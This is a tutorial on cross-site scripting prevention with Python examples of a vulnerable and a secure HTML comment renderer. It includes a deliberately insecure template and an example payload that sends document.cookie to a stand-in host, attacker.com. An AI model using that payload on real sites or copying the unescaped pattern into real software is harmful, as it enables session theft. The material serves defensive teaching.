# Topic: XSS Prevention - Cross-site scripting vulnerabilities, HTML entity encoding, and escape sanitizations
 
## 1. THE CROSS-SITE SCRIPTING (XSS) VULNERABILITY
- **Cross-Site Scripting (XSS)**: Occurs when user-supplied input is reflected back into a web application's HTML response without validation or escaping.
  - If an attacker inputs `<script>alert('XSS')</script>`, the browser parses and executes the script within the session context of the victim's browser, allowing attackers to steal session cookies, hijack tokens, or deface websites.
 
## 2. MITIGATION: HTML ENTITY ENCODING
- **The Solution**: Convert dynamic variables into safe HTML entity encodings before rendering them inside HTML templates:
  - `<` becomes `&lt;`
  - `>` becomes `&gt;`
  - `&` becomes `&amp;`
  - `"` becomes `&quot;`
  - `'` becomes `&#x27;`
- **How it works**: The browser renders `&lt;script&gt;` visually as literal text characters `<script>` on the screen, but does not interpret them as executable HTML tags, neutralizing the script payload.
 
---


```python
import html

# 1. Vulnerable reflection rendering
def vulnerable_render_comment(user_comment):
    """Vulnerable HTML renderer that interpolates user strings directly."""
    # DANGEROUS: Direct template injection
    html_page = f"""
    <div class="comment-box">
        <p>User comment: {user_comment}</p>
    </div>
    """
    return html_page

print("--- Vulnerable HTML Render (Normal Input) ---")
print(vulnerable_render_comment("Hello, this is a great site!"))

```

```python
print("\n--- XSS Injection Attack ---")
# Attacker enters a script tag to steal session details
xss_payload = "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>"
rendered_attack = vulnerable_render_comment(xss_payload)
print(rendered_attack)
# Expected: The script tags are output unmodified, so the victim's browser will execute it!

```

```python
# 2. Secure reflection rendering using html.escape
def secure_render_comment(user_comment):
    """Secure HTML renderer that escapes HTML characters before interpolation."""
    # Convert special characters into safe HTML entities
    escaped_comment = html.escape(user_comment)
    
    html_page = f"""
    <div class="comment-box">
        <p>User comment: {escaped_comment}</p>
    </div>
    """
    return html_page

print("\n--- Secure HTML Render (XSS Sanitized) ---")
rendered_secure = secure_render_comment(xss_payload)
print(rendered_secure)
# Expected: '<' is rendered as '&lt;', '>' as '&gt;'.
# The browser will display the text safely, but no script execution occurs!
```
